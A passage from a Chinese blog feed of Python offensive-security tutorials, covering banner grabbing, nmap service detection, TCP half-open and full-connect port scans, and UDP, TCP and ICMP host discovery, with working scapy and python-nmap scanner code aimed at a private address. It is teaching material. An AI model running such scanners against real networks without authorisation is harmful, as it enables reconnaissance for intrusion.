punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"系统类别:"</span><span class="token punctuation">,</span>osclass<span class="token punctuation">[</span><span class="token string">'osfamily'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第几代操作系统:"</span><span class="token punctuation">,</span>osclass<span class="token punctuation">[</span><span class="token string">'osgen'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>服务扫描</title>
      <link href="/2021/12/07/%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/"/>
      <url>/2021/12/07/%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="服务扫描的思路"><a href="#服务扫描的思路" class="headerlink" title="服务扫描的思路"></a>服务扫描的思路</h1><ul><li>常见的服务都会运行在指定的端口上（ftp:21,ssh:22,http:80等等），所以可以根据开放的端口号猜测端口上运行的服务（nmap-services库）</li><li>抓取软件banner信息</li><li>向目标开放的端口发送探针数据包，然后把返回的数据包与数据库中的记录进行比对，从而找出具体的服务信息（nmap-service-probe数据库）</li></ul><h1 id="抓取banner进行服务扫描程序"><a href="#抓取banner进行服务扫描程序" class="headerlink" title="抓取banner进行服务扫描程序"></a>抓取banner进行服务扫描程序</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockets<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span>banner<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token comment">#获取目标端口服务软件的banner信息</span>s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"port:80"</span><span class="token punctuation">,</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"service:"</span><span class="token punctuation">,</span>banner<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="使用python-nmap模块进行服务扫描程序"><a href="#使用python-nmap模块进行服务扫描程序" class="headerlink" title="使用python-nmap模块进行服务扫描程序"></a>使用python-nmap模块进行服务扫描程序</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> nmapnm<span class="token operator">=</span>nmap<span class="token punctuation">.</span>PortScanner<span class="token punctuation">(</span><span class="token punctuation">)</span>nm<span class="token punctuation">.</span>scan<span class="token punctuation">(</span>hosts<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">,</span>ports<span class="token operator">=</span><span class="token string">"80"</span><span class="token punctuation">,</span>arguments<span class="token operator">=</span><span class="token string">"-sV"</span><span class="token punctuation">)</span><span class="token keyword">for</span> host <span class="token keyword">in</span> nm<span class="token punctuation">.</span>all_hosts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> proto <span class="token keyword">in</span> nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">.</span>all_protocols<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> port <span class="token keyword">in</span> nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">[</span>proto<span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>service<span class="token operator">=</span>nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">[</span>proto<span class="token punctuation">]</span><span class="token punctuation">[</span>port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'product'</span><span class="token punctuation">]</span> <span class="token comment">#端口服务名称</span>version<span class="token operator">=</span>nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">[</span>proto<span class="token punctuation">]</span><span class="token punctuation">[</span>port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span> <span class="token comment">#端口服务版本</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"service:\t"</span><span class="token punctuation">,</span>service<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"version:\t"</span><span class="token punctuation">,</span>version<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>端口扫描-TCP半开扫描</title>
      <link href="/2021/12/07/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%8D%8A%E5%BC%80%E6%89%AB%E6%8F%8F/"/>
      <url>/2021/12/07/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%8D%8A%E5%BC%80%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="TCP半开扫描原理"><a href="#TCP半开扫描原理" class="headerlink" title="TCP半开扫描原理"></a>TCP半开扫描原理</h1><ul><li>目标端口开放<br>如果目标端口开放，我们向目标端口发送一个SYN请求，目标端口就会响应一个SYN+ACK数据包，然后我们向目标端口发送一个RST数据包来断开TCP连接</li><li>目标端口关闭<br>如果目标端口关闭，我们向目标端口发送一个SYN请求，目标端口就会响应一个RST数据包</li><li>目标端口被过滤<br>如果目标端口被网络安全设备或机制所过滤，我们向目标端口发送一个SYN请求，在大多数情况下，目标端口无响应。在有些情况下，目标端口会响应ICMP错误消息<ul><li>ICMP错误消息  <img src="/2021/12/07/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%8D%8A%E5%BC%80%E6%89%AB%E6%8F%8F/tcp%E5%8D%8A%E5%BC%801.png" class=""></li></ul></li></ul><h1 id="TCP半开扫描原理图"><a href="#TCP半开扫描原理图" class="headerlink" title="TCP半开扫描原理图"></a>TCP半开扫描原理图</h1><ul><li>目标端口开放<img src="/2021/12/07/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%8D%8A%E5%BC%80%E6%89%AB%E6%8F%8F/tcp%E5%8D%8A%E5%BC%802.png" class=""></li><li>目标端口关闭<img src="/2021/12/07/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%8D%8A%E5%BC%80%E6%89%AB%E6%8F%8F/tcp%E5%8D%8A%E5%BC%803.png" class=""></li><li>目标端口被过滤(在大多数情况下，目标端口无响应。在有些情况下，目标端口会响应ICMP错误消息，此处为大多数情况）<img src="/2021/12/07/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%8D%8A%E5%BC%80%E6%89%AB%E6%8F%8F/tcp%E5%8D%8A%E5%BC%804.png" class=""></li></ul><h1 id="TCP半开扫描程序"><a href="#TCP半开扫描程序" class="headerlink" title="TCP半开扫描程序"></a>TCP半开扫描程序</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"usage:tcp半开扫描.py host port"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>target<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>dport<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>packet<span class="token operator">=</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span>RandShort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dport<span class="token operator">=</span>dport<span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span>resp<span class="token operator">=</span>sr1<span class="token punctuation">(</span>packet<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&lt;class 'NoneType'>"</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s is filtered"</span><span class="token operator">%</span>dport<span class="token punctuation">)</span><span class="token keyword">elif</span> resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">.</span>code<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0&#125; is filtered"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>dport<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">elif</span> resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">0x12</span><span class="token punctuation">:</span>  <span class="token comment">#SYN+ACK</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125; is open"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>dport<span class="token punctuation">)</span><span class="token punctuation">)</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span>RandShort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dport<span class="token operator">=</span>dport<span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#向目标端口发送一个 RST数据包来断开TCP连接</span><span class="token keyword">if</span> resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">0x14</span><span class="token punctuation">:</span>  <span class="token comment">#RST</span><span class="token keyword">print</span><span class="token punctuation">(</span>dport<span class="token punctuation">,</span><span class="token string">"is closed"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>端口扫描-TCP全开扫描</title>
      <link href="/2021/12/06/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%85%A8%E5%BC%80%E6%89%AB%E6%8F%8F/"/>
      <url>/2021/12/06/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%85%A8%E5%BC%80%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="TCP全开扫描原理"><a href="#TCP全开扫描原理" class="headerlink" title="TCP全开扫描原理"></a>TCP全开扫描原理</h1><ul><li>目标端口开放<br>如果目标端口开放，主机端口向目标端口发送一个SYN请求，目标端口就会响应一个SYN+ACK，表示愿意接受这次连接的请求，这时主机端口再回应一个ACK，就成功的和目标端口建立了一个TCP连接</li><li>目标端口不开放<ul><li>目标端口关闭：如果目标端口关闭，主机端口向目标端口发送一个SYN请求，目标端口就会响应一个RST，表示不接受这次连接的请求，这样就中断了这次TCP连接</li><li>目标端口被过滤：在目标主机存活的前提下，如果目标的网络安全设备屏蔽了我们对目标某些端口的SYN请求，当主机端口向目标端口发送一个SYN请求，目标端口就会无响应</li></ul></li></ul><h1 id="TCP全开扫描原理图"><a href="#TCP全开扫描原理图" class="headerlink" title="TCP全开扫描原理图"></a>TCP全开扫描原理图</h1><img src="/2021/12/06/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%85%A8%E5%BC%80%E6%89%AB%E6%8F%8F/tcp1.png" class=""><img src="/2021/12/06/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%85%A8%E5%BC%80%E6%89%AB%E6%8F%8F/tcp2.png" class=""><img src="/2021/12/06/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-TCP%E5%85%A8%E5%BC%80%E6%89%AB%E6%8F%8F/tcp3.png" class=""><h1 id="基于TCP全开的端口扫描程序"><a href="#基于TCP全开的端口扫描程序" class="headerlink" title="基于TCP全开的端口扫描程序"></a>基于TCP全开的端口扫描程序</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"usage:tcpfullscan.py host port"</span><span class="token punctuation">)</span>sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>host<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>dport<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>resp<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span>RandShort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dport<span class="token operator">=</span>dport<span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&lt;class 'NoneType'>"</span><span class="token punctuation">:</span>  <span class="token comment"># &lt;class 'NoneType'>表示空，说明未收到响应</span><span class="token keyword">print</span><span class="token punctuation">(</span>dport<span class="token punctuation">,</span><span class="token string">"\tis closed"</span><span class="token punctuation">)</span><span class="token keyword">elif</span> resp<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">0x12</span><span class="token punctuation">:</span> <span class="token comment">#0x12代表SYN+ACK</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span>RandShort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dport<span class="token operator">=</span>dport<span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"AR"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment">#向目标端口发送ACK来完成TCP三次握手</span><span class="token keyword">print</span><span class="token punctuation">(</span>dport<span class="token punctuation">,</span><span class="token string">"\tis open"</span><span class="token punctuation">)</span><span class="token keyword">if</span> resp<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">0x14</span><span class="token punctuation">:</span> <span class="token comment">#0x14代表RST</span><span class="token keyword">print</span><span class="token punctuation">(</span>dport<span class="token punctuation">,</span><span class="token string">"\tis closed"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>主机状态扫描-UDP扫描</title>
      <link href="/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-UDP%E6%89%AB%E6%8F%8F/"/>
      <url>/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-UDP%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="UDP简介"><a href="#UDP简介" class="headerlink" title="UDP简介"></a>UDP简介</h1><p>UDP(用户数据报协议),是一种无连接的协议<br>UDP没有三次握手，向目标发送一个UDP数据包之后，目标不会响应任何UDP数据包</p><h1 id="UDP扫描的依据"><a href="#UDP扫描的依据" class="headerlink" title="UDP扫描的依据"></a>UDP扫描的依据</h1><p>如果目标主机存活，但是目标端口关闭，此时向目标主机的目标端口发送一个UDP数据包，目标主机就会响应一个ICMP协议的不可达(unreachable)数据包</p><h1 id="UDP扫描原理图"><a href="#UDP扫描原理图" class="headerlink" title="UDP扫描原理图"></a>UDP扫描原理图</h1><img src="/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-UDP%E6%89%AB%E6%8F%8F/udp%E6%89%AB%E6%8F%8F1.png" class=""><img src="/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-UDP%E6%89%AB%E6%8F%8F/udp%E6%89%AB%E6%8F%8F2.png" class=""><h1 id="scapy构造UDP请求包"><a href="#scapy构造UDP请求包" class="headerlink" title="scapy构造UDP请求包"></a>scapy构造UDP请求包</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">ans<span class="token punctuation">,</span>unans<span class="token operator">=</span>sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">)</span><span class="token operator">/</span>UDP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="python-nmap模块扫描"><a href="#python-nmap模块扫描" class="headerlink" title="python-nmap模块扫描"></a>python-nmap模块扫描</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">nm<span class="token punctuation">.</span>scan<span class="token punctuation">(</span>hosts<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">,</span>arguments<span class="token operator">=</span><span class="token string">"-PU"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>主机状态扫描-TCP扫描</title>
      <link href="/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-TCP%E6%89%AB%E6%8F%8F/"/>
      <url>/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-TCP%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="TCP简介"><a href="#TCP简介" class="headerlink" title="TCP简介"></a>TCP简介</h1><p>TCP(传输控制协议),是一个位于传输层的协议。<br>TCP是一种面向连接的，可靠的，基于字节流的传输层通信协议<br>TCP的特点是使用三次握手方式建立连接，这种建立连接的方法可以防止产生错误的连接</p><h1 id="TCP三次握手的过程"><a href="#TCP三次握手的过程" class="headerlink" title="TCP三次握手的过程"></a>TCP三次握手的过程</h1><img src="/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-TCP%E6%89%AB%E6%8F%8F/tcp%E6%89%AB%E6%8F%8F1.png" class=""><img src="/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-TCP%E6%89%AB%E6%8F%8F/tcp%E6%89%AB%E6%8F%8F2.png" class=""><img src="/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-TCP%E6%89%AB%E6%8F%8F/tcp%E6%89%AB%E6%8F%8F3.png" class=""><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><p>port,可以认为是设备与外界通信交流的出口<br>端口分为虚拟端口和物理端口<br>虚拟端口：指的是计算机内部或交换机，路由器内的端口<br>端口可以被不同的服务所使用来进行各种通信，如：web服务，ftp服务，smtp服务等</p><h1 id="TCP扫描原理图"><a href="#TCP扫描原理图" class="headerlink" title="TCP扫描原理图"></a>TCP扫描原理图</h1><img src="/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-TCP%E6%89%AB%E6%8F%8F/tcp%E6%89%AB%E6%8F%8F4.png" class=""><img src="/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-TCP%E6%89%AB%E6%8F%8F/tcp%E6%89%AB%E6%8F%8F5.png" class=""><img src="/2021/12/03/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-TCP%E6%89%AB%E6%8F%8F/tcp%E6%89%AB%E6%8F%8F6.png" class=""><p>总结：对目标主机进行TCP扫描，只要收到了TCP响应，就说明目标主机存活</p><h1 id="scapy构造TCP请求包"><a href="#scapy构造TCP请求包" class="headerlink" title="scapy构造TCP请求包"></a>scapy构造TCP请求包</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">ans<span class="token punctuation">,</span>unans<span class="token operator">=</span>sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：flags的值包括：SYN（建立连接），FIN（关闭连接），ACK（响应），PSH（有DATA数据传输），RST（连接重置)</p><h1 id="python-nmap模块扫描"><a href="#python-nmap模块扫描" class="headerlink" title="python-nmap模块扫描"></a>python-nmap模块扫描</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">nm<span class="token punctuation">.</span>scan<span class="token punctuation">(</span>hosts<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">,</span>arguments<span class="token operator">=</span><span class="token string">"-sT"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>主机状态扫描-ICMP扫描</title>
      <link href="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ICMP%E6%89%AB%E6%8F%8F/"/>
      <url>/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ICMP%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="ICMP简介"><a href="#ICMP简介" class="headerlink" title="ICMP简介"></a>ICMP简介</h1><p>ICMP位于TCP&#x2F;IP协议族中的网络层，ICMP的目的是用于在IP主机，路由器之间传递控制消息<br>因为互联网也经常发生各种错误，为了发现和处理这些错误，ICMP(互联网控制报文协议)应运而生<br>ICMP中提供了多种报文，这些报文分为两大类：差错报文和查询报文，查询报文都是由一个请求和一个应答构成<br>ICMP查询报文有4种：响应请求或应答，时间戳请求或应答，地址掩码请求或应答，路由器询问或应答。但在实际应用中，后面的3种成功率很低，所以主要使用第一种ICMP查询报文<br>ping命令就是响应请求或应答报文的应用，我们经常使用ping命令来测试本地与目标之间的连通性</p><h1 id="ICMP请求与应答"><a href="#ICMP请求与应答" class="headerlink" title="ICMP请求与应答"></a>ICMP请求与应答</h1><p>本地主机为192.168.1.1,目标主机为192.168.1.2，如果要判断目标是否为活跃主机，我们就需要向目标主机192.168.1.2发送一个ICMP请求，ICMP请求格式为</p><pre class="line-numbers language-none"><code class="language-none">IP层内容源IP地址:192.168.1.1目的IP地址:192.168.1.2ICMP层内容Type:8(表示请求）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果目标主机192.168.1.2活跃，它在接收到ICMP请求数据包之后，就会给出一个ICMP响应，ICMP响应格式为</p><pre class="line-numbers language-none"><code class="language-none">IP层内容源IP地址:192.168.1.2目的IP地址:192.168.1.1ICMP层内容Type:0(表示应答)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ICMP扫描原理图"><a href="#ICMP扫描原理图" class="headerlink" title="ICMP扫描原理图"></a>ICMP扫描原理图</h1><img src="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ICMP%E6%89%AB%E6%8F%8F/icmp%E5%8E%9F%E7%90%86%E5%9B%BE1.png" class=""><p>注：由于现在很多网络安全设备或机制会屏蔽ICMP，在这种情况下，即使目标主机处于活跃状态，也收不到来自目标主机的ICMP响应</p><img src="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ICMP%E6%89%AB%E6%8F%8F/icmp%E5%8E%9F%E7%90%86%E5%9B%BE2.png" class=""><h1 id="ICMP扫描抓包"><a href="#ICMP扫描抓包" class="headerlink" title="ICMP扫描抓包"></a>ICMP扫描抓包</h1><img src="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ICMP%E6%89%AB%E6%8F%8F/icmp%E6%8A%93%E5%8C%851.png" class=""><img src="/2021/12/01/%E4%B8%BB%E6%9C%BA%E7%8A%B6%E6%80%81%E6%89%AB%E6%8F%8F-ICMP%E6%89%AB%E6%8F%8F/icmp%E6%8A%93%E5%8C%852.png" class=""><h1 id="ICMP扫描的优点及局限性"><a href="#ICMP扫描的优点及局限性" class="headerlink" title="ICMP扫描的优点及局限性"></a>ICMP扫描的优点及局限性</h1><p>优点：无论是以太网还是互联网都可以使用ICMP扫描，应用范围广<br>局限：大量网络设备，例如：路由器，防火墙等都对ICMP进行了屏蔽，这样就会导致扫描结果不准确</p><h1 id="scapy构造ICMP请求包"><a href="#scapy构造ICMP请求包" class="headerlink" 